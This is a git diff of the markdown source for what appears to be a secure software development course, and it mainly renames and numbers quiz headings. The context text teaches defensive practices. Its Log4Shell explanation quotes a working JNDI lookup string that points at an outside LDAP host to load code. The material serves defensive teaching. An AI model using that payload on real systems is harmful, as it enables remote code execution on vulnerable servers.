@@ -37,7 +37,7 @@ This document is written to be easily understood by its audience (in this case, 
 
 For more, see [5 Stupid Grammar Rules You Should Never Follow Because They Make Your Writing Worse](https://www.inc.com/minda-zetlin/5-stupid-grammar-rules-you-should-never-follow-because-they-make-your-writing-wo.html) and [6 Grammar Superstitions: The Never-Never Rules](https://wac.colostate.edu/docs/books/grammar/chapter6.pdf).
 
-Note that edX requires groupings at 3 levels: Sections, Subsections, and Units. Only Units (level 3) can have content.  We represent this in the material below as follows:  A “Heading 1” represents the beginning of a Section and contains ONLY sequences beginning with “Heading 2” (no text). A “Heading 2” represents the beginning of a Subsection and contains ONLY sequences beginning with “Heading 3”. A “Heading 3” represents the beginning of a Unit and contains all content. A Heading 3 cannot be directly contained within a Heading 1. Heading 4 (and below) are used freely within a Unit.
+Note that edX requires groupings at 3 levels: Sections, Subsections, and Units. Only Units (level 3) can have content.  We represent this in the material below as follows:  A “Heading 1” represents the beginning of a Section and contains ONLY sequences beginning with “Heading 2” (no text). A “Heading 2” represents the beginning of a Subsection and contains ONLY sequences beginning with “Heading 3”. A “Heading 3” represents the beginning of a Unit and contains all content. A Heading 3 cannot be directly contained within a Heading 1. Heading 4 (and below) are used freely within a Unit. Technically quizzes are level 3 in edX, but they are represented as level 4 in the markdown because the quizzes are logically part of the section they quiz.
 
 The primary editable content is in markdown format. There should be no markdownlint errors using our configuration. You can add hyperlinks to internal sections as #<i>section_name</i> where <i>section_name</i> is the title transformed using GitHub's [`gfm_auto_identifiers`](https://pandoc.org/MANUAL.html#extension-gfm_auto_identifiers) algorithm: space becomes `-`, uppercase (ASCII) becomes lowercase, and punctuation (other than `-` and `_`) are removed.
 
@@ -222,7 +222,7 @@ These security objectives need some supporting mechanisms. For example, confiden
 
 What you specifically do depends on the software you are developing. If you are developing a lower-level library, you might not be directly supporting any of these supporting mechanisms, but you still have to make sure that what you are doing will fit into a larger program.
 
-### Quiz 1.1
+#### Quiz 1.1: What Does “Security” Mean?
 
 \>\>Match the terms with the correct definitions.<<
 
@@ -280,7 +280,7 @@ If you are looking for ideas for potential security requirements, one source is 
 
 **Finally:** If there is existing software that does something like the software you are developing, look at its security capabilities. They added those capabilities for a reason, and your software might need at least some of them as well.
 
-### Quiz 1.2
+#### Quiz 1.2: Security Requirements
 
 \>\>A typical requirement for an Internet-connected service is to stay available regardless of the attacks it undergoes. True or False?<<
 
@@ -460,7 +460,7 @@ Telemetry data is especially fraught with privacy and confidentiality issues. En
 
 The Linux Foundation’s [*“Telemetry Data Collection and Usage Policy”*](https://www.linuxfoundation.org/telemetry-data-policy/) presents a brief discussion of some of the issues that should be considered before implementing telemetry data collection, as well as discussing the Foundation’s approach to managing use of telemetry by its open source project communities. This may be useful to you in other contexts.
 
-### Quiz 1.3
+#### Quiz 1.3: Privacy Requirements
 
 \>\>Which of the following privacy-related statements is true?||Check all of the options below that are true, and do NOT check them otherwise.<<
 
@@ -558,7 +558,7 @@ But they are only aids to the real goal; they are not the goal itself. You can f
 
 This course will give you a number of tips to help you to reduce risks, focusing on lessons that previous developers have learned. But they are merely tips; they are merely an *aid* to developing secure software. When you are developing software, continuously think about the ways that an attacker might try to exploit your system. Anticipate the potential problems—while they are still risks—and mitigate them.
 
-### Quiz 1.4
+#### Quiz 1.4: Risk Management
 
 \>\>The purpose of developing secure software is to eliminate all possible security risks. True or False?<<
 
@@ -624,7 +624,7 @@ Simply inserting some “security tools” into an automated test suite, by itse
 
 You also should focus on continuous improvement, of both the software itself and the processes you use to develop it. If the current design or API is hard to use securely, make it easy to use securely. Look for ways to harden the software against attacks. Modify the verification processes by adding new tools, or changing the configuration of existing tools, to increasingly detect problems before they are released to users.
 
-### Quiz 1.5
+#### Quiz 1.5: Development Processes / Defense-in-Breadth
 
 \>\>To develop secure software, you should always rigorously develop all the requirements, then develop your complete design, and only then begin implementing the software. True or False?<<
 
@@ -638,7 +638,7 @@ This is false. This is a “waterfall” approach and is generally a very risky 
 
 [Explanation]
 
-### Quiz 1.6
+#### Quiz 1.6: Development Processes / Defense-in-Breadth
 
 \>\>To develop secure software, simply add security tools into your continuous integration pipeline. True or False?<<
 
@@ -678,7 +678,7 @@ None of these three basic functions (protect, detect, and respond) is effective 
 
 We will talk a lot about protection measures. It is typically cheaper to prevent problems than deal with them later (old proverbs apply here, e.g., *“an ounce of prevention is worth a pound of cure”*). But we will also discuss measures to detect and respond, because they are also necessary. At the very least, larger applications should include mechanisms like logging (to support detection) and backup (to support recovery), because they are necessary in applications we deploy.
 
-### Quiz 1.7
+#### Quiz 1.7: Protect, Detect, Respond
 
 \>\>Choose the correct answer.<<
 
@@ -748,7 +748,7 @@ But depending on how you measure things, anywhere from 90% to 99% or more vulner
 
 Identifying common kinds of vulnerabilities has another advantage, too: It will help you identify *other* kinds of vulnerabilities. As we have already noted, there is no substitute for thinking. But many developers find it challenging to view their systems like an attacker would. By looking at common kinds of vulnerabilities of the past, you can become more sensitive to vulnerabilities in general. So while knowing common kinds of vulnerabilities does not *replace* thinking, knowing them can *help* you think.
 
-### Quiz 1.8
+#### Quiz 1.8: Vulnerabilities
 
 \>\>Choose the true statement.<<
 
@@ -792,7 +792,7 @@ When thinking about your design, you need to think about what components you can
 
 * If you are writing a mobile (smartphone) application that talks to a server you control, you presumably trust that remote server. You should not trust the communication path between your mobile application and server (so you will want to use TLS to encrypt it). You certainly should not trust other applications on the smartphone, unless you have special reason to trust one. So clearly, there is a boundary between your mobile application and (1) the general Internet and (2) other mobile applications. Trust is often not absolute; you probably trust that the mobile smartphone operating system will run for that user, but that user might be an attacker, so you should probably ensure that some secrets never get into the mobile application at all.
 
-### Quiz 2.1
+#### Quiz 2.1: What Are Security Design Principles?
 
 \>\>If you follow secure design principles, you will always create secure software. True or False?<<
 
@@ -834,7 +834,7 @@ Remember, design principles are simply rules of thumb. As you break your problem
 
 Next, we will look in more detail at a few of these principles, because they have ramifications that might not be obvious. In the next unit we’ll start by looking at *least privilege*.
 
-### Quiz 2.2
+#### Quiz 2.2: Widely-Recommended Secure Design Principles
 
 \>\>If we keep how the system works a secret, then the system will be secure. True or False?<<
 
@@ -894,7 +894,7 @@ It is unfortunately common to mismanage privileges. For example, there are many 
 
 🔔 Improper privilege management is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #29 and 2019 CWE Top 25 #24. It is [CWE-269](https://cwe.mitre.org/data/definitions/269.html) (*Improper Privilege Management*).
 
-### Quiz 2.3
+#### Quiz 2.3: Least Privilege
 
 \>\>One way you *might* be able to implement some of the “least privilege” privilege (depending on the program) is to use SQL GRANT statements so the program doesn’t have the rights to change certain data even if an attacker takes control of that program. True or False?<<
 
@@ -985,7 +985,7 @@ Building a system with security checks that can be bypassed is a dangerous mista
 
 In general, you are better off with simple solutions that do not involve trying to trust systems controlled by attackers.
 
-### Quiz 2.4
+#### Quiz 2.4: Complete Mediation (Non-Bypassability)
 
 \>\>A server sends some React-based JavaScript to a web browser. A developer wants to include some security checks of the input in the client-side (browser-side) React code, and says that the server can trust those security checks because the server sent the client-side React code in the first place. Which of the following is true?<<
 
@@ -1090,7 +1090,7 @@ A good example of this is the Content Security Policy (CSP) supported by modern 
 
 🔔 Insecure design is such a common mistake in web applications that it is 2021 OWASP Top 10 #4.
 
-### Quiz 2.6
+#### Quiz 2.6: Other Design Principles
 
 \>\>Which of the following is a useful additional security principle?||Check all of the options below that are generally-accepted security principles, and do NOT check them otherwise.<<
 
@@ -1198,7 +1198,7 @@ Most of these questions also apply to closed source software that is reused.
 
 Most software depends on other software, which in turn often depends on other software with many tiers. A software bill of materials (SBOM) is a nested inventory that identifies the software components that make up a larger piece of software. Many ecosystems have ecosystem-specific SBOM formats. There are also some SBOM formats that support arbitrary ecosystems: [Software Package Data Exchange (SPDX)](https://spdx.dev/), [Software ID (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/), and [CycloneDX](https://github.com/CycloneDX/specification). When an SBOM is available for a component you are thinking about using, it’s often easier to use that data to help answer some of the questions listed above. It’s also good to provide an SBOM to potential users of your software, for the same reasons.
 
-### Quiz 3.1
+#### Quiz 3.1: Selecting (Evaluating) Open Source Software
 
 \>\>What is evidence that the software you are thinking of reusing will probably be a good choice for security? Select all answers that apply.<<
 
@@ -1248,7 +1248,7 @@ You also need to ensure that your system is not vulnerable to a “dependency co
 🔔 Dependency confusion is a special case of 2021 CWE Top 25 #34, *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)). Relying on plugins, libraries, or modules from untrusted sources, and relying on untrustworthy content delivery networks, is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.
 
 
-## Quiz 3.2
+#### Quiz 3.2: Downloading and Installing Reusable Software
 
 \>\>What are good ways to acquire software? Select all answers that apply.<<
 
@@ -1292,7 +1292,7 @@ If you are obsoleting an interface used by others, do your best to provide a lon
 
 These are merely tips, and are by no means exhaustive. It is great that we have so much great software to reuse; modern software development would be impossible without them. However, there are a few potential security pitfalls with reused software. The practices we have discussed in this chapter will help you avoid many security problems due to reused software.
 
-### Quiz 3.3
+#### Quiz 3.3: Updating Reused Software
 
 \>\>Reused software is so dangerous that you should always prefer to rewrite that software yourself when you can. True or False?<<
 
@@ -1378,7 +1378,7 @@ Later, we will discuss various kinds of security analysis tools. One kind, fuzze
 
 Again, your code should use *allowlisting* (narrowly identifying what is legal and reject the rest), not *denylisting* (trying to identify bad inputs). Try to make that allowlist pattern as narrow as possible, including limiting the maximum input length (and minimum input length if appropriate).
 
-### Quiz 1.1
+#### Quiz 1.1: How Do You Validate Input?
 
 \>\>In general, you should validate inputs from untrusted users by:<<
 
@@ -1416,7 +1416,7 @@ Some input formats are composite structures of a lot of other data. For example,
 
 Many programs need to validate text fields, but those fields’ rules are not defined in a pre-existing library. Some tools allow us to easily handle them, but to use them, we need to understand some background. We will first need to discuss more about text, unicode, and locales in general. Then we will discuss text validation in general and the common way of doing so - regular expressions.
 
-### Quiz 1.2
+#### Quiz 1.2: Input Validation: A Few Simple Data Types
 
 \>\>Select all the good practices for validating an input number from an untrusted source:<<
 
@@ -1498,7 +1498,7 @@ But once we move beyond the ASCII subset, many other tricks exist:
 
 Visual spoofing can be very challenging to counter in general. Normalization and using distinctive fonts is not always enough, but it can sometimes be very helpful.
 
-### Quiz 1.3
+#### Quiz 1.3: Sidequest: Text, Unicode, and Locales
 
 \>\>In Unicode a character is represented by a 16-bit value. True or False?<<
 
@@ -1614,7 +1614,7 @@ Almost all regex implementations support *branches* - that is, “**aa|bb|cc**�
 
 Again, you should know what your software should not accept, and use some of those examples as automated test cases to ensure that your software will correctly reject them. This is especially important with regexes, because it is easy to write a regex that looks fine but allows inputs it wasn’t intended to. This can help you catch, for example, missing anchors or failures to surround branches with parentheses.
 
-### Quiz 1.4
+#### Quiz 1.4: Using Regular Expressions for Text Input Validation
 
 \>\>Which of the following matches only “1 or more lowercase Latin letters” using an extended regular expression (given the POSIX locale)?<<
 
@@ -1672,7 +1672,7 @@ There are many solutions to this problem, including the following:
 
 If you are interested in more details, see the [OWASP discussion](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS) about this.
 
-### Quiz 1.5
+#### Quiz 1.5: Countering ReDoS Attacks on Regular Expressions
 
 \>\>Which of these are *practical* ways to mitigate ReDoS attacks? Select all answers that apply.<<
 
@@ -1706,7 +1706,7 @@ Some people recommend enforcing string type constraints (e.g., only allowing spe
 
 🔔 Insecure deserialization is such a common mistake in web applications that it is 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, and 2019 CWE Top 25 #23. It is [CWE-502](https://cwe.mitre.org/data/definitions/502.html), *Deserialization of Untrusted Data*. It is also considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Attackers may find such vulnerabilities harder to exploit, but once the vulnerability is found it can result in immediate compromise of an entire system, because it may provide complete control of the system to the attacker.
 
-### Quiz 1.6
+#### Quiz 1.6: Insecure Deserialization
 
 \>\>One of the big risks in deserializing data is that, depending on the serialization format, the data might cause attacker-defined code to be executed. True or False?<<
 
@@ -1789,7 +1789,7 @@ If your program allows uploads, try to limit uploads to specific file types and 
 
 🔔 Inadequate restriction of uploads is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #10 and 2019 CWE Top 25 #16. It is identified as [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *Unrestricted Upload of File with Dangerous Type*.
 
-### Quiz 1.7
+#### Quiz 1.7: Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)
 
 \>\>When reading data in common data formats like XML and JSON, prefer to use libraries designed to securely handle them, try to reject structures that are not syntactically valid, and then where practical, check that they meet whatever specific schema you require. True or False?<<
 
@@ -1827,7 +1827,7 @@ We will later discuss various tools for verification. While tools can help find 
 
 > In 2013 the Target Corporation’s network was breached. In this incident 40 million credit and debit card numbers and 70 million records of personal information were stolen. The full costs are difficult to estimate, but the credit card unions spent over $200 million just to reissue cards. The best available evidence suggests that the initial breach occurred in a third party heating, ventilation, and air-conditioning (HVAC) firm. The attackers used these compromised credentials to penetrate the Target network. The attackers were able to subvert sensitive systems due to the weak segmentation between non-sensitive and sensitive networks inside Target ([*Breaking the Target: An Analysis of Target Data Breach and Lessons Learned*](https://arxiv.org/pdf/1701.04940.pdf), by Xiaokui Shu, Andrew Ciambrone and Danfeng Yao, 2017).
 
-### Quiz 1.8
+#### Quiz 1.8: Minimizing Attack Surface, Identification, Authentication, and Authorization
 
 \>\>It is important that humans be able to directly verify that authentication is non-bypassable. True or False?<<
 
@@ -1859,7 +1859,7 @@ If you *do* write a **setuid**/**setgid** program, your program must protect its
 🔔 Untrusted search path is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #22. It is [CWE-426](https://cwe.mitre.org/data/definitions/426.html), *Untrusted Search Path*. 2021 CWE Top 25 #34 covers the related *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)).
 
 
-### Quiz 1.9
+#### Quiz 1.9: Search Paths and Environment Variables (including setuid/setgid Programs)
 
 \>\>If your software has to run where environment variables are not from trusted sources, you should extract only the variables needed, erase all the environment variables, and then set the environment variables to safe values (including safe values provided as input). True or False?<<
 
@@ -1889,7 +1889,7 @@ Some systems try to depend on *secure boot* or similar mechanisms to ensure that
 
 🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5. 2021 CWE Top 25 #19 [CWE-276](https://cwe.mitre.org/data/definitions/276.html) covers *Incorrect Default Permissions*.
 
-### Quiz 1.10
+#### Quiz 1.10: Special Inputs: Secure Defaults and Secure Startup
 
 \>\>For ease of use, you should deliver applications with a standard known password and make it clear in the documentation how to change that password. True or False?<<
 
@@ -1971,7 +1971,7 @@ This attack seems subtle, but this is a clear violation of our basic rule of thu
 
 However, many applications do have to process untrusted data. In that case, when you have to process untrusted data, treat it as **_radioactive_** - that is, be careful when you process it in any way, remembering that it might be from an attacker. There are many ways you need to be careful, as we will discuss.
 
-### Quiz 2.1
+#### Quiz 2.1: Prefer Trusted Data. Treat Untrusted Data as Dangerous
 
 \>\>If we receive a password reset request for an email account, and it has a case-insensitive match to a verified email account in our database, we should send the confirmation to the email account the user just sent. True or False?<<
 
@@ -2015,7 +2015,7 @@ For outbound authentication, credentials should be stored outside the code in a 
 
 🔔 Hardcoded credentials are such a common cause of security vulnerabilities that they are 2021 CWE Top 25 #16 and 2019 CWE Top 25 #19. This weakness is [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *Use of Hard-coded Credentials*. The related *Insufficiently Protected Credentials* is 2021 CWE Top 25 #21 and 2019 CWE Top 25 #27 as [CWE-522](https://cwe.mitre.org/data/definitions/522.html).
 
-### Quiz 2.2
+#### Quiz 2.2: Avoid Default & Hardcoded Credentials
 
 \>\>Secret keys should be stored in source code so that they cannot be easily read, as they could be if they were stored in separate files. True or False?<<
 
@@ -2044,7 +2044,7 @@ For our purposes, conversions do not include determining if a value is truthy. I
 🔔 *Incorrect Type Conversion or Cast* ([CWE-704](https://cwe.mitre.org/data/definitions/704.html)) is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #28. 2021 CWE Top 25 #36 refers to its special case, *Access of Resource Using Incompatible Type ('Type Confusion')* ([CWE-843](https://cwe.mitre.org/data/definitions/843.html)).
 
 
-### Quiz 2.3
+#### Quiz 2.3: Avoid Incorrect Conversion or Cast
 
 \>\>Which of the following might be concerning about a cast? Select all answers that apply.<<
 
@@ -2162,7 +2162,7 @@ Modern compilers for these languages, and the operating systems that support the
 
 If you are writing code that is not memory-safe, or calling code that is not memory-safe, make sure hardening measures like these are enabled whenever you can, including in compilation, test, and production. The good news is that hardening measures like these will slow down some exploits. But in the end, hardening measures often do not *prevent* exploits. In the best case, these hardening measures turn “take over program” into “program stops working”... and that is the *best* case. The only way to not have vulnerable code… is to not have vulnerable code.
 
-### Quiz 2.4
+#### Quiz 2.4: Countering Out-of-Bounds Reads and Writes (Buffer Overflow)
 
 \>\>Programs written in memory-unsafe languages, such as C and C++, must be careful to *never* allow an untrusted user to cause an out-of-bounds read or write. This can be challenging to do without fail; correct application of functions like **snprintf()** can help. True or False?<<
 
@@ -2196,7 +2196,7 @@ In cases where that is not practical, simplify your code as best you can so that
 
 🔔 Use-after-free is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #7 and 2019 CWE Top 25 #7. It is [CWE-416](https://cwe.mitre.org/data/definitions/416.html) (*Use After Free*). Double-free is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #31. It is [CWE-415](https://cwe.mitre.org/data/definitions/415.html) (*Double Free*).  Failing to release memory once it is no longer needed is 2021 CWE Top 25 #32; it is [CWE-401](https://cwe.mitre.org/data/definitions/401.html) (Missing Release of Memory after Effective Lifetime).
 
-### Quiz 2.5
+#### Quiz 2.5: Double-free, Use-after-free, and Missing Release
 
 \>\>In C and C++ it doesn’t matter if you use a memory region after freeing it, as long as you use the memory region within the same function or method. True or False?<<
 
@@ -2244,7 +2244,7 @@ So, if you do use C and C++, there are ways you can reduce your risks. We have a
 
 We will later discuss using tools to try to detect these, but be warned: most tools at best detect *some* undefined behaviors, not all of them. Your best defense is to use a language with no or few undefined behaviors. Where that is not reasonable, know exactly what is not defined, and carefully write code so it does not depend on undefined behaviors.
 
-### Quiz 2.6
+#### Quiz 2.6: Avoid Undefined Behavior
 
 \>\>In C and C++, a null pointer dereference is not a serious security problem, because you will just read a data value or, at worst, crash the program. True or False?<<
 
@@ -2285,7 +2285,7 @@ One of the simplest ways to ensure an attacker cannot trigger vulnerabilities fr
 
 🔔  Integer overflow or wraparound is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #12 and 2019 CWE Top 25 #8. It is [CWE-190](https://cwe.mitre.org/data/definitions/190.html), *Integer overflow or wraparound*.
 
-### Quiz
+#### Quiz 2.7: Avoid Integer Overflow, Wraparound, and Underflow
 
 >>Integer overflows can be ignored when handling untrusted data. True or False?<<
 
@@ -2351,7 +2351,7 @@ Where possible, use libraries and APIs that do this for you; they are easier to 
 
 Let’s now examine some common injection attack cases and how to handle them securely. Again, an injection vulnerability is when a program accepts data from an attacker and improperly hands that data to some command interpreter. Some of the most common problems occur when that data is sent to a database system (SQL injection attacks) or an operating system command interpreter (OS command injection attacks), so we will focus on those. Once you understand how to deal with these two common cases, it will be much clearer how to properly handle other interpreters we will not cover here (e.g., the Lightweight Directory Access Protocol (LDAP)). We will begin by discussing sending data to database systems, which are often vulnerable to SQL injection attacks.
 
-### Quiz 3.1
+#### Quiz 3.1: Introduction to Securely Calling Programs
 
 \>\>Just pick secure software to reuse, and your application will be secure. True or False?<<
 
@@ -2707,7 +2707,7 @@ There are other approaches, of course. You can write your own escape code, but t
 
 In summary, properly using parameterized statement libraries makes it much easier to write secure code. In addition, they typically make code easier to read, automatically handle the variations between how databases escape things, and sometimes they are faster than doing metacharacter escapes yourself.
 
-### Quiz 3.2
+#### Quiz 3.2: SQL Injection
 
 \>\>Parameterized statements (including prepared statements) are a valuable countermeasure against SQL injection, but you have to use placeholders for every data value that might possibly be controllable by an attacker. True or False?<<
 
@@ -2739,7 +2739,7 @@ Of course, if you are calling a program with any data that might be from an atta
 
 🔔 OS command injection is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #11 and 2021 CWE Top 25 #5. It is [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)*.
 
-### Quiz 3.3
+#### Quiz 3.3: OS Command (Shell) injection
 
 \>\>Avoid unnecessarily calling an operating system shell when you simply want to run another program. True or False?<<
 
@@ -2849,7 +2849,7 @@ The details of this attack were described as follows ([SSD Disclosure, SSD Advis
 
 🔔 2021 CWE Top 25 #31 is [CWE-59](https://cwe.mitre.org/data/definitions/59.html), Improper Link Resolution Before File Access ('Link Following').
 
-### Quiz 3.4
+#### Quiz 3.4: Filenames (Including Path Traversal and Link Following)
 
 \>\>Select all the statements that are true.<<
 
@@ -2875,7 +2875,7 @@ This goes the other way, too. If you are developing an application with an inter
 
 Of course, once you receive information, make sure that you check for error conditions (either directly or via raising an exception). If a request with untrusted data fails, your program should not just blithely go on as if it succeeded. Error handling is such an important topic that we will cover that next.
 
-### Quiz 3.5
+#### Quiz 3.5: Call APIs for Programs and Check What Is Returned
 
 \>\>From a program, try to use same API used by humans, as that may be better tested. True or False?<<
 
@@ -2951,7 +2951,7 @@ Some languages allow multi-value returns and use that for error handling. For ex
 
 Error-handling is a fact of life, but you need to make sure your error handling (not just your “main” line) is secure. It is easy to forget to detect or handle errors. Where you can, try to use approaches that are more likely to work correctly *even* as the program is changed by others.
 
-### Quiz 3.6
+#### Quiz 3.6: Handling Errors
 
 \>\>Select all the true statement(s).<<
 
@@ -2981,7 +2981,7 @@ As a general rule, don’t include passwords or very sensitive data in logs. Sin
 
 🔔 *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10. *Inclusion of Sensitive Information in Log Files*, [CWE-532](https://cwe.mitre.org/data/definitions/532.html), is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #39 and 2019 CWE Top 25 #35.
 
-### Quiz 3.7
+#### Quiz 3.7: Logging
 
 \>\>Select all the true statement(s).<<
 
@@ -3023,7 +3023,7 @@ Assertions are often great, because they can stop problems before they get more 
 
 Inserting assertions can make a verification technique called “fuzzing” more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.
 
-### Quiz 3.8
+#### Quiz 3.8: Debug and Assertion Code
 
 \>\>Select all the true statement(s).<<
 
@@ -3057,7 +3057,7 @@ An obvious but surprisingly common problem is loops where an attacker can cause 
 
 Make sure that you have backups of important datasets and a workable recovery process. That way, if an attacker manages to shut down the whole system, the data loss will be minimized. If necessary, you could even restart the service somewhere else or in some other form using the backups. You should have multiple backups, and at least some older ones should be in *cold storage* (that is, the backups cannot be modified by a later computer attack). That way, if newer backups are corrupted by an attacker (such as by using a ransomware attack), there are backups that can still be used.
 
-#### Quiz 3.9
+#### Quiz 3.9: Countering Denial-of-Service (DoS) Attacks
 
 \>\>Select all the approaches that might help counter denial-of-service (DoS) attacks if your service is accessible on the public internet:<<
 
@@ -3125,7 +3125,7 @@ Make sure that you tell the receiver exactly how to interpret the output. Otherw
 
 More generally, you often need to **_escape your output_** so that any data you generate that might be influenced by an attacker cannot become an attack. This is an especially common problem in web applications. One of the most common vulnerabilities in web applications is called *Cross-Site Scripting* (XSS). This problem is all about not sending output properly and, in particular, about escaping output correctly. The next unit will explain the vulnerability and how to deal with it.
 
-### Quiz 4.1
+#### Quiz 4.1: Introduction to Sending Output
 
 \>\>Do not waste space telling a receiving web browser the data type or encoding being sent, as browsers do an excellent job at automatically determining this information. True or False?<<
 
@@ -3229,7 +3229,7 @@ A very mild hardening measure is to set the attribute **HttpOnly** on cookies. T
 
 XSS is usually best countered by choosing a framework or library that automatically escapes output for you. However, programs often have many outputs. It would be best if we paired this solution with something else that limited the damage when a mistake *is* made. On the web there is a solution: the Content Security Policy (CSP). The next unit will discuss this.
 
-### Quiz 4.2
+#### Quiz 4.2: Countering Cross-Site Scripting (XSS)
 
 \>\>Choosing a framework or library that automatically escapes HTML output is often one of the best ways to counter XSS attacks. True or False?<<
 
@@ -3277,7 +3277,7 @@ CSP has various other mechanisms to limit privileges. Another CSP parameter that
 
 When you are developing a site it might be wise to go through the CSP specification and try to maximally limit what you ask web browsers to allow. The less you allow, the less attackers can do if you make a mistake. There are other HTTP headers that can help harden a site against attack; in the next unit we will look at a few.
 
-### Quiz 4.3
+#### Quiz 4.3: Content Security Policy (CSP)
 
 \>\>Using a CSP setting that forbids inline scripts, requires that JavaScript only be executed from specific trusted locations, and moving all JavaScript to separate files into those locations can reduce the impact of cross-site scripting (XSS) attacks. True or False?<<
 
@@ -3307,7 +3307,7 @@ If your site is publicly accessible, you can easily test your headers using the 
 
 Also, an important word about HTTP headers in general. You may decide, for various reasons, to provide other HTTP headers. If some of that header information might be from an attacker, be *especially careful*. As always, do very careful input validation. There is a nasty attack, in particular, where the attacker manages to insert a newline in the input; this will cause *HTTP header splitting* in HTTP versions 1.1 and 2, where the rest of the text after the newline may be interpreted as an HTTP header provided by the attacker. This could disable many protections or even implement an attack.
 
-### Quiz 4.4
+#### Quiz 4.4: Other HTTP Hardening Headers
 
 \>\>When sending information using HTTP, you can set various HTTP headers (such as HTTP Strict-Transport-Security (HSTS)) to help harden your system against attack. True or False?<<
 
@@ -3369,7 +3369,7 @@ Similarly, make *sure* that you provide users a “log off” (“sign off”) a
 
 You should also eventually log out an inactive session automatically. Some easy ways to do that are to not set an expiration date (so the user will log out when they shut down their browser) or set an expiration date for when the user will be logged out. Frameworks will typically let you configure this easily.
 
-### Quiz 4.5
+#### Quiz 4.5: Cookies & Login Sessions
 
 \>\>When a user logs in again, reuse the session id if session ids are used and already present, to reduce confusion to the user. True or False?<<
 
@@ -3409,7 +3409,7 @@ Of course, there are other ways an attacker might be able to gain temporary cont
 
 2. If an action is especially dangerous (e.g., account deletion or moving a large sum of money), require a separate additional authenticated confirmation that the user really is requesting it. This is good anyway, because there are many ways an attacker might be able to temporarily gain control over an account; limiting the impact is all part of managing risk.
 
-### Quiz 4.6
+#### Quiz 4.6: CSRF / XSRF
 
 \>\>CSRF vulnerabilities are less common today because web application frameworks and web browsers generally have countermeasures to make these vulnerabilities less likely. True or False?<<
 
@@ -3457,7 +3457,7 @@ The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheet
 
 🔔 Open redirects are such a common cause of security vulnerabilities that this weakness is 2021 CWE Top 25 #37 and 2019 CWE Top 25 #32. It is [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 
-### Quiz 4.7
+#### Quiz 4.7: Open Redirects and Forwards
 
 \>\>It is fine to support a redirector URL, e.g., **<https://bank.example.com/redirect?url=https://dangerous.example.com>**, as long as the URL is carefully sanitized to only allow trusted URLs. True or False?<<
 
@@ -3487,7 +3487,7 @@ Of course, if you can trust that other page, that is not a security problem. So 
 
 The simplest solution is to avoid using **target=...** in HTML, and always set **target="&#95;self"** when calling JavaScript **window.open()...** especially for links to user-generated content and external domains. If you decide to use HTML **target=**, also use **rel="noopener noreferrer"**. The “**noopener**” tells the web browser to *not* allow the JavaScript to gain control over the referring window (so **window.opener** won’t give access to it). The ”**noreferrer**” prevents passing on the referrer information to the new tab/window ([*Security Vulnerability and Browser Performance Impact of Target=”&#95;blank”*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) by Darren Sim, 2019).
 
-### Quiz 4.8
+#### Quiz 4.8: HTML **target** and JavaScript **window.open()**
 
 \>\>In an HTML anchor (**&lt;a href=...>**) to another site, if you use **target=...** with a value other than **&#95;self**, be sure to also set “**rel**” to “**noopener noreferrer**” prevent control by that other site of the originating tab. True or False?<<
 
@@ -3527,7 +3527,7 @@ The main solution is to ensure that you greatly limit how you construct any URLs
 
 🔔 Server-Side Request Forgery (SSRF) is such a common cause of security vulnerabilities that it is 2021 OWASP Top 10 #10, 2021 CWE Top 25 #24, and 2019 CWE Top 25 #30. It is [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
 
-### Quiz 4.9
+#### Quiz 4.9: Using Inadequately Checked URLs / Server-Side Request Forgery (SSRF)
 
 \>\>URLs are merely ways to locate information, so validating them is not important. True or False?<<
 
@@ -3602,7 +3602,7 @@ Many output formatting systems have a way to support internationalization (**i18
 > log4j is a software component written in Java that implements logging (recording events for later auditing and debugging). It is widely used for logging, including by Apple iPhones, Teslas, and Minecraft chat. Log4Shell (formally CVE-2021-44228) is an extremely serious vulnerability in the log4j 2.X series. In vulnerable versions of log4j, "an attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.” (NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) It's easy to trigger; an attacker can include logged text with forms like `${jndi:ldap://45.83.193.150:1389/Exploit}`. There were almost 8,000 tests in the log4j project, but none found this; the tests showed that expected functions worked, but didn't ensure that this undesired functionality would not work. This is an example of allowing untrusted users to control the output format, in this case enabling the execution of arbitrary code. Be wary of giving untrusted users this dangerous level of control!
 
 
-### Quiz 4.10
+#### Quiz 4.10: Format Strings and Templates
 
 \>\>Select all the true statement(s).<<
 
@@ -3632,7 +3632,7 @@ Also, ensure that users cannot receive unauthorized information. Permissions and
 
